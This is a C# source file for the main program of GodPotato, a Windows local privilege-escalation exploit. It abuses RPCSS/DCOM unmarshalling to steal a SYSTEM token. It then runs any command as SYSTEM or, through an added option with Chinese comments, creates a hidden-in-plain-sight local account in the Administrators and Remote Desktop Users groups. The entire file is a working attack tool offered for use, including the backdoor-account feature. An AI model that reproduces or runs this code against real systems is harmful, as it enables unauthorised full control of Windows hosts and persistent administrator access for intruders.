using System;
using System.IO;
using GodPotato.NativeAPI;
using System.Security.Principal;
using SharpToken;
using static GodPotato.ArgsParse;

namespace GodPotato
{
    internal class Program
    {


        class GodPotatoArgs
        {
            [ArgsAttribute("cmd", "cmd /c whoami", Description = "CommandLine", Required = false)]
            public string cmd { get; set; }

            // 添加用户
            [ArgsAttribute("adduser", "", Required = false, Description = "添加用户（格式：用户名:密码）")]
            public string AddUser { get; set; }
        }



        static void Main(string[] args)
        {
            TextWriter ConsoleWriter = Console.Out;

            GodPotatoArgs potatoArgs;

            string helpMessage = PrintHelp(typeof(GodPotatoArgs), @"                                                                                               
    FFFFF                   FFF  FFFFFFF                                                       
   FFFFFFF                  FFF  FFFFFFFF                                                      
  FFF  FFFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
  FFF   FFF                 FFF  FFF   FFF             FFF                  FFF                
 FFFF        FFFFFFF   FFFFFFFF  FFF   FFF  FFFFFFF  FFFFFFFFF   FFFFFF  FFFFFFFFF    FFFFFF   
 FFFF       FFFF FFFF  FFF FFFF  FFF  FFFF FFFF FFFF   FFF      FFF  FFF    FFF      FFF FFFF  
 FFFF FFFFF FFF   FFF FFF   FFF  FFFFFFFF  FFF   FFF   FFF      F    FFF    FFF     FFF   FFF  
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF         FFFFF    FFF     FFF   FFFF 
 FFFF   FFF FFF   FFFFFFF   FFF  FFF      FFFF   FFF   FFF      FFFFFFFF    FFF     FFF   FFFF 
  FFF   FFF FFF   FFF FFF   FFF  FFF       FFF   FFF   FFF     FFFF  FFF    FFF     FFF   FFFF 
  FFFF FFFF FFFF  FFF FFFF  FFF  FFF       FFF  FFFF   FFF     FFFF  FFF    FFF     FFFF  FFF  
   FFFFFFFF  FFFFFFF   FFFFFFFF  FFF        FFFFFFF     FFFFFF  FFFFFFFF    FFFFFFF  FFFFFFF   
    FFFFFFF   FFFFF     FFFFFFF  FFF         FFFFF       FFFFF   FFFFFFFF     FFFF     FFFF    
"
, "GodPotato", new string[]
    {
        "GodPotato -cmd \"cmd /c whoami\"",
        "GodPotato -adduser test:123456"
    });


            if (args.Length == 0)
            {
                ConsoleWriter.WriteLine(helpMessage);
                return;
            }
            else
            {
                try
                {
                    potatoArgs = ParseArgs<GodPotatoArgs>(args);
                }
                catch (Exception e)
                {
                    if (e.InnerException != null)
                    {
                        e = e.InnerException;
                    }
                    ConsoleWriter.WriteLine("Exception:" + e.Message);
                    ConsoleWriter.WriteLine(helpMessage);
                    return;
                }
            }

            try
            {
                GodPotatoContext godPotatoContext = new GodPotatoContext(ConsoleWriter, Guid.NewGuid().ToString());

                ConsoleWriter.WriteLine("[*] CombaseModule: 0x{0:x}", godPotatoContext.CombaseModule);
                ConsoleWriter.WriteLine("[*] DispatchTable: 0x{0:x}", godPotatoContext.DispatchTablePtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunction: 0x{0:x}", godPotatoContext.UseProtseqFunctionPtr);
                ConsoleWriter.WriteLine("[*] UseProtseqFunctionParamCount: {0}", godPotatoContext.UseProtseqFunctionParamCount);

                ConsoleWriter.WriteLine("[*] HookRPC");
                godPotatoContext.HookRPC();
                ConsoleWriter.WriteLine("[*] Start PipeServer");
                godPotatoContext.Start();

                GodPotatoUnmarshalTrigger unmarshalTrigger = new GodPotatoUnmarshalTrigger(godPotatoContext);
                try
                {
                    ConsoleWriter.WriteLine("[*] Trigger RPCSS");
                    int hr = unmarshalTrigger.Trigger();
                    ConsoleWriter.WriteLine("[*] UnmarshalObject: 0x{0:x}", hr);

                }
                catch (Exception e)
                {
                    ConsoleWriter.WriteLine(e);
                }


                WindowsIdentity systemIdentity = godPotatoContext.GetToken();
                if (systemIdentity != null)
                {
                    ConsoleWriter.WriteLine("[*] CurrentUser: " + systemIdentity.Name);
                    if (!string.IsNullOrEmpty(potatoArgs.AddUser))
                    {
                        // 分割用户名和密码
                        string[] userParts = potatoArgs.AddUser.Split(new[] { ':' }, 2);
                        if (userParts.Length != 2)
                        {
                            ConsoleWriter.WriteLine("[!] 参数格式错误！正确格式：-adduser 用户名:密码");
                            return;
                        }

                        string username = userParts[0];
                        string password = userParts[1];

                        // 在 SYSTEM 上下文中执行用户添加
                        systemIdentity.Impersonate(); // 切换到 SYSTEM 令牌
                        try
                        {
                            UserManager.CreateLocalUserWithDirectoryEntry(
                    ConsoleWriter,
                    userParts[0],    // 用户名
                    userParts[1],    // 密码
                    addToAdministrators: true,
                    addToRemoteDesktopUsers: true
                    );
                        }
                        catch (Exception ex)
                        {
                            ConsoleWriter.WriteLine($"[!] 操作失败: {ex.Message}");
                        }
                        finally
                        {
                            WindowsIdentity.Impersonate(IntPtr.Zero); // 恢复原上下文
                        }
                    }
                    else if (!string.IsNullOrEmpty(potatoArgs.cmd))
                    {
                        // 原有命令执行逻辑
                        TokenuUils.createProcessReadOut(ConsoleWriter, systemIdentity.Token, potatoArgs.cmd);
                    }
                }

                else
                {
                    // ConsoleWriter.WriteLine("[!] 提权失败，无法获取 SYSTEM 令牌");
                    ConsoleWriter.WriteLine("[!] Failed to impersonate security context token");

                }

                godPotatoContext.Restore();
                godPotatoContext.Stop();
            }
            catch (Exception e)
            {
                ConsoleWriter.WriteLine("[!] " + e.Message);

            }

        }
    }
}